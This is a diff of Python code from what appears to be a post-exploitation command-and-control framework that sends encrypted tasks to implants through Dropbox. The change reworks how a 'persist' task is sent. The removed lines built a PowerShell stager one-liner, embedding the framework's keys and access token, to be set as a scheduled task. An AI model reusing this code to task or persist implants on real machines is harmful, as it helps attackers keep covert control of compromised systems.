@@ -238,18 +238,12 @@ class AgentHandler:
 			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
 
 	#------------------------------------------------------------------------------------
-	def taskAgentWithPersist(self, stageName):
+	def taskAgentWithPersist(self):
 		# Create a task
-		task = self.statusHandler.createTask(self.agentID, "persist", args = [stageName])
+		task = self.statusHandler.createTask(self.agentID, "persist")
 		
-		# Persistency is achieved by setting a scheduled task on a powershell oneliner stager
-		stagerParameters = { 'stagePublicURL': self.statusHandler.publishedStageList[stageName], 'xorKey': Crypto.convertKey(self.statusHandler.masterKey, outputFormat = "sha256"), 'masterKey': helpers.b64encode(self.statusHandler.masterKey), 'accessToken': self.dropboxHandler.token }
-		genStager = stagers.GenStager(stagerParameters)
-		oneLiner = genStager.oneLiner()
-		
-
 		# Prepare the task format, then put the task into the command file
-		data = "persist\n{}\n{}\n{}".format(task['id'], oneLiner, helpers.randomString(16))
+		data = "persist\n{}\n{}".format(task['id'], helpers.randomString(16))
 		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), Crypto.encryptData(data, self.statusHandler.masterKey))
 		
 		if r is not None:
